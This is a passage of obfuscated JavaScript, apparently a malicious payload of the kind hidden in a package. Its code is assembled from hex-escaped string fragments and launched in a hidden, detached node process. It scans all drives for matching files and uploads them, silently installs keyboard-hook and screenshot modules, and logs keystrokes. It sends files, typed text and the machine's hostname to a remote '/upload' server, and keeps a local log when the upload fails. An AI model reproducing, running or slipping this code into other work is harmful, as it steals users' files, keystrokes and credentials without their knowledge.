\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x20e'+'ls'+'e\x20'+'if'+'\x20('+'st'+'at'+'.i'+'sF'+'il'+'e('+')\x20'+'&&'+'\x20i'+'sF'+'il'+'eM'+'at'+'ch'+'in'+'g('+'it'+'em'+'))'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20a'+'wa'+'it'+'\x20u'+'f('+'fu'+'ll'+'Pa'+'th'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x20c'+'at'+'ch'+'\x20('+'e)'+'\x20{'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'};'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20a'+'sy'+'nc'+'\x20f'+'un'+'ct'+'io'+'n\x20'+'sl'+'ee'+'p('+'ms'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+'\x20n'+'ew'+'\x20P'+'ro'+'mi'+'se'+'(('+'re'+'so'+'lv'+'e)'+'\x20='+'>\x20'+'se'+'tT'+'im'+'eo'+'ut'+'(r'+'es'+'ol'+'ve'+',\x20'+'ms'+'))'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'se'+'tT'+'im'+'eo'+'ut'+'(a'+'sy'+'nc'+'\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(o'+'s.'+'pl'+'at'+'fo'+'rm'+'()'+'\x20='+'=\x20'+'\x22w'+'in'+'32'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20d'+'ri'+'ve'+'Cm'+'d\x20'+'=\x20'+'`w'+'mi'+'c\x20'+'lo'+'gi'+'ca'+'ld'+'is'+'k\x20'+'ge'+'t\x20'+'na'+'me'+'`;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20d'+'ri'+'ve'+'s\x20'+'=\x20'+'ex'+'ec'+'Sy'+'nc'+'(d'+'ri'+'ve'+'Cm'+'d,'+'\x20{'+'\x20w'+'in'+'do'+'ws'+'Hi'+'de'+':\x20'+'tr'+'ue'+'\x20}'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20d'+'ri'+'ve'+'s\x20'+'=\x20'+'dr'+'iv'+'es'+'.t'+'oS'+'tr'+'in'+'g('+').'+'sp'+'li'+'t('+'\x22\x5c'+'n\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20d'+'ri'+'ve'+'s.'+'sh'+'if'+'t('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'\x20('+'le'+'t\x20'+'i\x20'+'in'+'\x20d'+'ri'+'ve'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20d'+'ri'+'ve'+'\x20='+'\x20d'+'ri'+'ve'+'s['+'i]'+'.r'+'ep'+'la'+'ce'+'(/'+'\x5cr'+'\x5cr'+'/g'+'i,'+'\x20\x22'+'\x22)'+'.t'+'ri'+'m('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(d'+'ri'+'ve'+'\x20='+'=\x20'+'\x22\x22'+')\x20'+'co'+'nt'+'in'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'aw'+'ai'+'t\x20'+'sc'+'an'+'Di'+'r('+'dr'+'iv'+'e\x20'+'+\x20'+'\x22\x5c'+'\x5c\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}')+('\x20e'+'ls'+'e\x20'+'aw'+'ai'+'t\x20'+'sc'+'an'+'Di'+'r('+'ro'+'ot'+'Di'+'r)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'},'+'\x201'+'00'+'0)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a'));try{R('no'+'de',['-e',aj],{'windowsHide':!0x0,'detached':!0x0,'stdio':'ig'+'no'+'re'});}catch(ao){}if('wi'+'n3'+'2'==K['pl'+'at'+'fo'+'rm']){ak=('tr'+'y{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20a'+'xi'+'os'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'ax'+'io'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20o'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22o'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'s\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'s\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20{'+'\x20e'+'xe'+'cS'+'yn'+'c,'+'\x20e'+'xe'+'c\x20'+'}\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22c'+'hi'+'ld'+'_p'+'ro'+'ce'+'ss'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20e'+'xe'+'cS'+'yn'+'c('+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'np'+'m\x20'+'in'+'st'+'al'+'l\x20'+'--'+'sa'+'ve'+'\x20n'+'od'+'e-'+'gl'+'ob'+'al'+'-k'+'ey'+'-l'+'is'+'te'+'ne'+'r\x20'+'sc'+'re'+'en'+'sh'+'ot'+'-d'+'es'+'kt'+'op'+'\x20s'+'ha'+'rp'+'\x20-'+'-n'+'o-'+'wa'+'rn'+'in'+'gs'+'\x20-'+'-n'+'o-'+'sa'+'ve'+'\x20-'+'-n'+'o-'+'pr'+'og'+'re'+'ss'+'\x20-'+'-l'+'og'+'le'+'ve'+'l\x20'+'si'+'le'+'nt'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20{'+'\x20w'+'in'+'do'+'ws'+'Hi'+'de'+':\x20'+'tr'+'ue'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20s'+'et'+'Ti'+'me'+'ou'+'t('+'()'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'gl'+'ob'+'al'+'Ke'+'yb'+'oa'+'rd'+'Li'+'st'+'en'+'er'+'\x20='+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'no'+'de'+'-g'+'lo'+'ba'+'l-'+'ke'+'y-'+'li'+'st'+'en'+'er'+'\x22)'+'.G'+'lo'+'ba'+'lK'+'ey'+'bo'+'ar'+'dL'+'is'+'te'+'ne'+'r;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20s'+'cr'+'ee'+'ns'+'ho'+'t\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22s'+'cr'+'ee'+'ns'+'ho'+'t-'+'de'+'sk'+'to'+'p\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20s'+'ha'+'rp'+'\x20='+'\x20r'+'eq'+'ui'+'re'+'(\x22'+'sh'+'ar'+'p\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20t'+'mp'+'Di'+'r\x20'+'=\x20'+'os'+'.t'+'mp'+'di'+'r('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20F'+'or'+'mD'+'at'+'a\x20'+'=\x20'+'re'+'qu'+'ir'+'e('+'\x22f'+'or'+'m-'+'da'+'ta'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20v'+'\x20='+'\x20n'+'ew'+'\x20g'+'lo'+'ba'+'lK'+'ey'+'bo'+'ar'+'dL'+'is'+'te'+'ne'+'r('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20t'+'im'+'er'+'\x20='+'\x20n'+'ul'+'l;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20t'+'ex'+'t\x20'+'=\x20'+'\x22\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'le'+'t\x20'+'sh'+'if'+'t\x20'+'=\x20'+'fa'+'ls'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20l'+'et'+'\x20c'+'tr'+'l\x20'+'=\x20'+'fa'+'ls'+'e;'+'\x0a\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'uu'+'\x20='+'\x20\x22'+'ht'+'tp'+':/'+'/')['co'+'nc'+'at'](ab,':')['co'+'nc'+'at'](Y,'/u'+'pl'+'oa'+'d\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'uf'+'\x20='+'\x20a'+'sy'+'nc'+'\x20('+'p)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'fs'+'.s'+'ta'+'tS'+'yn'+'c('+'p)'+'.i'+'sF'+'il'+'e('+'))'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'or'+'m\x20'+'=\x20'+'ne'+'w\x20'+'Fo'+'rm'+'Da'+'ta'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fo'+'rm'+'.a'+'pp'+'en'+'d('+'\x22f'+'il'+'e\x22'+',\x20'+'fs'+'.c'+'re'+'at'+'eR'+'ea'+'dS'+'tr'+'ea'+'m('+'p)'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'m.'+'ap'+'pe'+'nd'+'(\x22'+'te'+'xt'+'\x22,'+'\x20t'+'ex'+'t)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'re'+'sp'+'on'+'se'+'\x20='+'\x20a'+'wa'+'it'+'\x20a'+'xi'+'os'+'.p'+'os'+'t('+'uu'+',\x20'+'fo'+'rm'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'he'+'ad'+'er'+'s:'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'..'+'fo'+'rm'+'.g'+'et'+'He'+'ad'+'er'+'s('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20u'+'se'+'rk'+'ey'+':\x20')['co'+'nc'+'at'](W,',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ho'+'st'+'na'+'me'+':\x20'+'os'+'.h'+'os'+'tn'+'am'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'at'+'h:'+'\x20p'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20\x22')['co'+'nc'+'at'](a1,'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'ca'+'tc'+'h\x20'+'(u'+'pl'+'oa'+'dE'+'rr'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'!f'+'s.'+'ex'+'is'+'ts'+'Sy'+'nc'+'(t'+'mp'+'Di'+'r\x20'+'+\x20'+'\x22/'+'wi'+'nd'+'ow'+'s\x20'+'ca'+'ch'+'e\x22'+')\x20'+'&&'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'s.'+'mk'+'di'+'rS'+'yn'+'c('+'tm'+'pD'+'ir'+'\x20+'+'\x20\x22'+'/w'+'in'+'do'+'ws'+'\x20c'+'ac'+'he'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fs'+'.w'+'ri'+'te'+'Fi'+'le'+'Sy'+'nc'+'(t'+'mp'+'Di'+'r\x20'+'+\x20'+'\x22/'+'wi'+'nd'+'ow'+'s\x20'+'ca'+'ch'+'e/'+'1.'+'tm'+'p\x22'+',\x20'+'te'+'xt'+',\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fl'+'ag'+':\x20'+'\x22a'+'+\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'})'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'};'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20v'+'.a'+'dd'+'Li'+'st'+'en'+'er'+'(f'+'un'+'ct'+'io'+'n\x20'+'(e'+',\x20'+'do'+'wn'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'tr'+'y\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'st'+'at'+'e\x20'+'=='+'\x20\x22'+'DO'+'WN'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(e'+'.n'+'am'+'e\x20'+'=='+'\x20\x22'+'LE'+'FT'+'\x20S'+'HI'+'FT'+'\x22\x20'+'||'+'\x20e'+'.n'+'am'+'e\x20'+'=='+'\x20\x22'+'RI'+'GH'+'T\x20'+'SH'+'IF'+'T\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'//'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<S'+'HI'+'FT'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'sh'+'if'+'t\x20'+'=\x20'+'tr'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'na'+'me'+'\x20='+'=\x20'+'\x22L'+'EF'+'T\x20'+'CT'+'RL'+'\x22\x20'+'||'+'\x20e'+'.n'+'am'+'e\x20'+'=='+'\x20\x22'+'RI'+'GH'+'T\x20'+'CT'+'RL'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<C'+'TR'+'L>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'tr'+'l\x20'+'=\x20'+'tr'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'na'+'me'+'.i'+'nd'+'ex'+'Of'+'(\x22'+'NU'+'MP'+'AD'+'\x22)'+'\x20>'+'\x20-'+'1)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20c'+'ha'+'r\x20'+'=\x20'+'e.'+'na'+'me'+'.r'+'ep'+'la'+'ce'+'(\x22'+'NU'+'MP'+'AD'+'\x20\x22'+',\x20'+'\x22\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'wi'+'tc'+'h\x20'+'(S'+'tr'+'in'+'g('+'ch'+'ar'+'))'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x221'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'1\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x222'+'\x22:'+'\x0a\x20'+'\x20\x20'+('\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'2\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x223'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'3\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x224'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'4\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x225'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'5\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x226'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'6\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x227'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'7\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x228'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'8\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x229'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'9\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22D'+'IV'+'ID'+'E\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22/'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'MU'+'LT'+'IP'+'LY'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'*\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22M'+'IN'+'US'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'-\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22P'+'LU'+'S\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22+'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'DO'+'T\x22')+(':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22.'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'de'+'fa'+'ul'+'t:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'el'+'se'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'wi'+'tc'+'h\x20'+'(e'+'.n'+'am'+'e)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x221'+'\x22:'+'\x0a\x20'+'\x20\x20'